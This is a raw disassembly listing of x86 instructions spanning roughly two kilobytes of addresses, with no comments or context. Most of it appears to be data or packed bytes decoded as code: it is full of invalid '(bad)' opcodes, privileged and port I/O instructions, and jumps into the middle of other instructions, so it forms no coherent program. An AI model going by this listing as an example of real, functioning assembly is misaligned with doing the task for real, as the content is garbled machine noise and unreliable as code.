  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
